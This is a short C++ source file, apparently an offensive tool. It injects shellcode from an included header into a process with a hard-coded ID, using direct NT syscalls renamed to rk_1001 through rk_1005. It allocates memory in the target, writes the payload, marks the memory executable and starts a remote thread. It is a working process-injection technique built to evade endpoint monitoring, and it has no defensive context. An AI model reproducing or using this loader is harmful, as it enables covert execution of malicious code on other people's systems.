#include <iostream>
#include "shellcode.h"
#include "syscalls.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

int main(int argc, char* argv[])
{
    //rk_1001 -> OpenProcess
    //rk_1002 -> AllocateVirtuaMemory
    //rk_1003 -> WriteVirtualMemory
    //rk_1004 -> ProtectVirtualMemory
    //rk_1005 -> CreateThreadEx

    int pid = 11112;

    HANDLE hProcess;
    CLIENT_ID clientId{};
    clientId.UniqueProcess = (HANDLE)pid;
    OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };

    NT_SUCCESS(rk_1001(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId));

    size_t shellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]);

    PVOID baseAddress = NULL;
    size_t allocSize = shellcodeSize;


    NT_SUCCESS(rk_1002(hProcess, &baseAddress, 0, &allocSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));

    size_t bytesWritten;

    NT_SUCCESS(rk_1003(hProcess, baseAddress, &shellcode, shellcodeSize, &bytesWritten));

    DWORD oldProtect;

    NT_SUCCESS(rk_1004(hProcess, &baseAddress, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtect));

    HANDLE hThread;

    NT_SUCCESS(rk_1005(&hThread, GENERIC_EXECUTE, NULL, hProcess, baseAddress, NULL, FALSE, NULL, NULL, NULL, NULL));

    return EXIT_SUCCESS;
}
